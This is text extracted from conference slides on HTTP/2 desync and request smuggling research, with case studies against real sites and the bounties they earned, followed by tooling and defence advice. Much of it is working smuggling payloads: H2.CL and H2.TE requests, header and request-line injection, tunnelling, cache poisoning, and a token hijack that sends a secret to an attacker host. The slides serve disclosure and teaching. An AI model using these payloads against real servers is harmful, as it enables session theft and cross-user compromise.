HTTP/2
The Sequel is Always Worse
James Kettle
Intro
2019-08: HTTP Desync Attacks
2020-09: The Bitbucket mystery
2021-01: Bitbucket confirmed… but unexploitable
2021-03: Research collision
2021-03: Bitbucket breakthrough cascade
- New, more powerful type of desync
- Entire issue class becoming exploitable
- Atlassian logging everyone out of Jira
- Contacting CERT, awarding 3x{max bounty}
• HTTP/2 desync attacks
• Request tunnelling
• HTTP/2 exploit primitives
• HTTP/2 hacking pitfalls, tooling & defence
Outline
Live Q&A during stream:
Discord: @albinowax
Twitter: @albinowax
user-agent burp
x=123&y=4
:method POST
:path
:authority 
/login
psres.net
:method GET
:path
:authority 
/robots.txt
psres.net
POST /login HTTP/1.1\r\n
Host: psres.net\r\n
User-Agent: burp\r\n
Content-Length: 9\r\n
\r\n
x=123&y=4
HTTP/1.1 403 Forbidden\r\n
Content-Length: 6\r\n
\r\n
Failed
GET / HTTP/1.1\r\n
Host: psres.net\r\n
\r\n
HTTP/1.1 200 OK\r\n
Content-Length: 26\r\n
\r\n
User-Agent: *\r\n
Disallow: /
Failed
:status 403
User-Agent: *
Disallow: /
:status 403
HTTP/1.1                                        HTTP/2
StreamID: 1
StreamID: 1
StreamID: 3
StreamID: 3
HTTP/2 Desync Attacks
Suggested prior reading: HTTP Desync Attacks
Request Smuggling via HTTP/2 downgrades
Classic request smuggling is CL.TE or TE.CL
(exceptions apply)
HTTP/2 downgrade smuggling is H2.CL or H2.TE
H2.CL Desync
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: barGET /anything HTTP/1.1
Host: www.netflix.com
Zuul/Netty
Back-end
CVE-2021-21295
HTTP/1.1 200 OK
HTTP/1.1 302 Found
Location: https://02.rs?x.netflix.com/n
Downgrade
content-length 4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
:method POST
:path
:authority 
/n
netflix.com
:method GET
:path
:authority 
/anything
netflix.com
Front-end
$20,000
POST /identity/XUI/ HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 68
Transfer-Encoding: chunked
0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
H2.TE Desync: URL token hijack
GET /b2blanding/show/oops HTTP/1.1
Host: psres.net
Referer: https://id.b2b.oath.com/?…&code=secret
GET /?…&code=secret HTTP/1.1
any message containing connection-specific header fields MUST be treated as malformed
AWS ALB & Incapsula WAF
+$7,000
=$27,000
transfer-encoding chunked
0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
:method POST
:path
:authority 
/identitfy/XUI
id.b2b.oath.com
H2.TE Desync: Header hijack
POST /account/login HTTP/1.1
Host: accounts.athena.aol.com
Content-Length: 104
Transfer-Encoding: chunked
0
GET /account/1/logout?next=https://psres.net/ HTTP/1.1
X-Ignore: X
OPTIONS / HTTP/1.1
Host: psres.net
Access-Control-Request-Headers: authorization
Authorization: Bearer eyJhbGwiOiJIUzI1NiIsInR6cCI6Ik…
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: authorization
GET /??? HTTP/1.1
+$10,000
=$37,000
H2.TE via Request Header Injection
POST / HTTP/1.1\r\n
Host: start.mozilla.org\r\n
Foo: b\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
Any request that contains a character not permitted in a header field value MUST be treated as malformed
HTTP/1.1 200 
Age: 0
evil-response
GET /poisoned9.js HTTP/1.1r\n
Host: start.mozilla.org\r\n
foo b\r\n
transfer-encoding: chunked
0\r\n
\r\n
GET / HTTP/1.1\r\n
Host: evil-netlify-domain\r\n
Content-Length: 5\r\n
\r\n
x=
:method
:authority 
POST
start.mozilla.org
+$4,000
=$41,000
GET /poisoned9.js HTTP/1.1
Host: start.mozilla.org
:path /
H2.X via Request Splitting - Resp Queue Poisoning 
Req1
Req3 
Req4
Resp1
Resp2
Resp3
Req2
Resp4
GET / HTTP/1.1
Foo: bar
Host: eco.atlassian.net
GET /robots.txt HTTP/1.1
X-Ignore: x
Host: eco.atlassian.net\r\n
\r\n
foo bar
Host: eco.atlassian.net
GET /robots.txt HTTP/1.1
X-Ignore: x
:method
:authority 
GET
eco.atlassian.net
(SA44790)
H2.TE via header name injection
GET / HTTP/1.1
foo
transfer-encoding: chunked
host: ecosystem.atlassian.net
GET / HTTP/1.1
foo: bar
transfer-encoding: chunked
host: ecosystem.atlassian.net
Problem:
Solution:
:method POST
foo
transfer-encoding
chunked
:method POST
foo: bar
transfer-encoding
chunked
Header names unfiltered
H2.TE via request line injection
Pseudo-headers unfiltered
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
Host: eco.atlassian.net
GET / HTTP/1.1
Host: eco.atlassian.net
GET /robots.txt HTTP/1.1
x: x HTTP/1.1
Host: eco.atlassian.net
\r\n blocked, but \r and \n allowed individually
:method GET / HTTP/1.1
Transfer-encoding: chunked
x: x
:path /ignored
:method POST
:path / HTTP/1.1\n
Host: eco.atlassian.net\n
\n
GET /robots.txt HTTP/1.1\n
x: x
Tunnelling
Rule bypass, 
header 
spoofing
Internal 
header theft
Cache 
poisoning
Direct 
cross-user 
attacks
Response 
queue 
poisoning
No-reuse
X
Client-connection affinity
X
X
X
Client-IP affinity
X
X
X
\
Full
X
X
X
X
X
Possible attacks
Frontend->backend connection-reuse style dictates which attacks are possible
Connection-reuse
Potential attacks
X                      X
No connection reuse
POST /n HTTP/1.1
Host: example.com
Content-Length: 4
abcdGET /404plz HTTP/1.1
Foo: bar
GET /anything HTTP/1.1
HTTP/1.1 302 Found
Content-Length: 5
movedHTTP/1.1 408 Request Timeout
…
HTTP/1.1 200 OK
Tunnelling confirmation
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
0
GET / HTTP/1.1
Host: example.com
HTTP/1.1 301 Moved Permanently
Content-Length: 162
Location: /en
301 Moved…
HTTP/1.1 301 Moved Permanently
Content-Length: 162…
Does the front-end think it's sending one response?
transfer-encoding chunked
0
GET / HTTP/1.1
Host: example.com
:method POST
:path
:authority 
/
example.com
location /en
301 Moved…
HTTP/1.1 301 Moved Permanently
Content-Length: 162…
:status 301
Problem: Front-end reads $content-length bytes from back-end
Tunnel-vision
POST /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked
0
POST / HTTP/1.1
…
HTTP/1.1 200 OK
Content-Length: 7
HTTP/1.1 403 
Content-Length: 3973
…
A server MAY send a Content-Length header field in a response to a HEAD request - RFC 7230
HEAD /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked
0
POST / HTTP/1.1
HTTP/1.1 200 OK
Content-Length: 7
content
HTTP/1.1 403 
…
Never read 
by front-end
Leaking internal headers via tunnelling
POST /blog HTTP/1.1
Foo: bar
Host: bitbucket.wpengine.com
Content-Length: 200
s=cow
SSLClientCipher: TLS_AES_128
Host: bitbucket.wpengine.com
Content-length: 7
foo=bar
You searched for cowSSLClientCipher: TLS_AES_128_GCM_SHA256, 
version=TLSv1.3, bits=128Host: bitbucket.wpengine.comSSLSessionID: X-
Cluster-Client-IP: 81.132.48.250Connection: Keep-Alivecontent-length: 7
SSLClientCertStatus: NoClientCert
X-Forwarded-For-Key: redacted-secret
foo bar
Host: bitbucket.wpengine.com
Content-Length: 200
s=cow
foo=bar
:method POST
:path
:authority 
/blog
bitbucket.org
:method PUT
:path /!api/internal/snippets
Cache poisoning via tunnelling
HTTP/1.1 404 Not Found
Content-Type: text/html
X-Cache-Info: cached
Content-Length: 5891
HTTP/1.1 301 Moved Permanently
Location: https://bitbucket.org/wp-admin/?
foo bar
Host: x
GET /wp-admin? HTTP/1.1
Host: bitbucket.wpengine.com
:method HEAD
:path
:authority 
/blog/?x=dontpoisoneveryone
bitbucket.org
Poison https://bitbucket.org/blog/?x=dontpoisoneveryone with malicious JS:
+$15,000
=$56,000
HTTP/2 Exploit Primitives
Ambiguous HTTP/2 requests
:authority and host both specify the host… and are both optional!
:authority example.com
:method GET
:path
:path 
/some-path
/different-path
:method GET
:authority
host
example.com
attacker.com
Duplicate path, method, scheme:
Host-header attacks
URL prefix injection
HTTP/1.1 301 Moved Permanently
Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
'Host' header value of request to `http://psres.net/://redacted.com/` 
doesn't match request target authority
Enabling Host-header attacks
Path override
:scheme http://start.mozilla.org/xyz?
:method GET
:path
:authority 
/ffx36.js
start.mozilla.org
:method GET
:authority
:scheme 
redacted.com
http://psres.net
Header name splitting
GET / HTTP/1.1
Host: redacted.net
transfer-encoding: chunked:
transfer-encoding: chunked
:method POST
:path
:authority 
/
redacted.net
host: psres.net 443
:method GET
:path
:authority 
/
example.com
GET / HTTP/1.1
Host: example.com
Host: psres.net: 443
The inconvenient colon
Request line injection - Apache  
Deny from all
essential information
• HTTP/2 and HTTP/1.1 share the same port
• Servers advertise HTTP/2 support via ALPN field in TLS handshake
• Some forget
Detect with:
• HTTP Request Smuggler 'Hidden-H2'
• Burp Scanner
• curl --http2 --http2-prior-knowledge
Hidden-HTTP/2
• HTTP/2 promises great request encapsulation
• Sometimes requests break all subsequent requests
• Some servers subtly treat the first request differently
• Manage this using:
• Turbo Intruder: requestsPerConnection
• Repeater: Send on new connection
• Further research pending
Connection state traps
• Existing tooling does not work
• Libraries/curl refuse to send most attacks
• Binary format rules out netcat/openssl
• Turbo Intruder - Custom open-source H/2-stack, use as BApp/CLI/library
• http2smugl - Patched Golang, open source, CLI-only
• Burp Suite - Exposed via Repeater & Extender-API
• Detection: HTTP Request Smuggler
• Timeout probe (favour FP)
• HEAD probe (favour FN)
The tooling situation
Provided every case study
Network architects
• Use HTTP/2 end to end instead of downgrading
Server vendors
• Enforce HTTP/1.1 limitations
Developers
• Drop HTTP/1.1 assumptions
• Don't trust :scheme
Defence
References & further reading
Further reading
Whitepaper: https://portswigger.net/research/http2
Labs: https://portswigger.net/web-security/request-smuggling
Tool: https://github.com/PortSwigger/http-request-smuggler
Emil Lerner's H/2 research: https://standoff365.com/phdays10/schedule/tech/
http-request-smuggling-via-higher-http-versions/
Response Smuggling: Pwning HTTP/1.1 Connections - Martin Doyhenard
Primary sources
HTTP Desync Attacks: https://portswigger.net/research/http-desync-attacks
@defparam's response queue poisoning: https://youtu.be/3tpnuzFLU8g
HTTP/2 breaks assumptions at multiple layers
HTTP/2 downgrades are hazardous
Request tunnelling is a real threat
@albinowax
Email: PI:EMAIL
Takeaways